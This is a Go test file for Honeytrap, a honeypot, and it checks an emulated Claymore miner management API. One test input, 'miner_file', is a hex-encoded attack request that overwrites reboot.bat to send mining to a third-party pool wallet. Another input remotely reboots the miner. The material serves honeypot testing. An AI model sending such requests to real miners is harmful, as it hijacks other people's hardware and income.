/*
* Honeytrap
* Copyright (C) 2016-2017 DutchSec (https://dutchsec.com/)
*
* This program is free software; you can redistribute it and/or modify it under
* the terms of the GNU Affero General Public License version 3 as published by the
* Free Software Foundation.
*
* This program is distributed in the hope that it will be useful, but WITHOUT
* ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
* FOR A PARTICULAR PURPOSE.  See the GNU Affero General Public License for more
* details.
*
* You should have received a copy of the GNU Affero General Public License
* version 3 along with this program in the file "LICENSE".  If not, see
* <http://www.gnu.org/licenses/agpl-3.0.txt>.
*
* See https://honeytrap.io/ for more details. All requests should be sent to
* licensing@honeytrap.io
*
* The interactive user interfaces in modified source and object code versions
* of this program must display Appropriate Legal Notices, as required under
* Section 5 of the GNU Affero General Public License version 3.
*
* In accordance with Section 7(b) of the GNU Affero General Public License version 3,
* these Appropriate Legal Notices must retain the display of the "Powered by
* Honeytrap" logo and retain the original copyright notice. If the display of the
* logo is not reasonably feasible for technical reasons, the Appropriate Legal Notices
* must display the words "Powered by Honeytrap" and retain the original copyright notice.
 */
package claymore

import (
	"bufio"
	"context"
	"io/ioutil"
	"net"
	"net/http/httptest"
	"reflect"
	"strings"
	"testing"

	"net/http"

	"encoding/json"

	"github.com/honeytrap/honeytrap/pushers"
)

type Test struct {
	Name     string
	Req      string
	Expected string
}

var tests = []Test{

	Test{
		Name: "miner_reboot",
		Req:  `{"id":0,"jsonrpc":"2.0","method":"miner_reboot"}`,
		Expected: `{
"id":0,
"jsonrpc":"2.0",
"result":true
}`,
	},

	Test{
		Name:     "miner_file",
		Req:      `{"id":0,"jsonrpc":"2.0","method":"miner_file","params":["reboot.bat","4574684463724d696e657236342e657865202d65706f6f6c206574682d7573322e6477617266706f6f6c2e636f6d3a38303038202d6577616c20307864303839376461393262643764373735346634656131386638313639646263303862656238646637202d6d6f64652031202d6d706f72742033333333202d6d707377206775764a746f43785539"]}`,
		Expected: `{}`,
	},

	Test{
		Name:     "miner_getstat1",
		Req:      `{"id":0,"jsonrpc":"2.0","method":"miner_getstat1"}`,
		Expected: `{"id":0,"jsonrpc":"2.0","result":["10.1 - ETH","4286","149336;7492;0","30620;29877;28285;30605;29946","0;0;0","off;off;off;off;off","62;65;51;64;61;75;51;67;62;72","eth-eu1.nanopool.org:9999","0;1;0;0"]}`,
	},
}

func TestClaymore(t *testing.T) {
	c := Claymore()
	c.SetChannel(pushers.MustDummy())

	for _, tst := range tests {
		server, client := net.Pipe()
		defer server.Close()
		defer client.Close()

		go c.Handle(context.TODO(), server)

		req := httptest.NewRequest("POST", "/", strings.NewReader(tst.Req))
		if err := req.Write(client); err != nil {
			t.Error(err)
		}

		rdr := bufio.NewReader(client)

		resp, err := http.ReadResponse(rdr, req)
		if err != nil {
			t.Error(err)
		}

		body, _ := ioutil.ReadAll(resp.Body)

		var got interface{}
		if err := json.Unmarshal(body, &got); err != nil {
			t.Error(err)
		}

		var expected interface{}
		if err := json.Unmarshal([]byte(tst.Expected), &expected); err != nil {
			t.Error(err)
		}

		if !reflect.DeepEqual(got, expected) {
			t.Errorf("Test %s failed: got %+#v, expected %+#v", tst.Name, got, expected)
			return
		}
	}
}
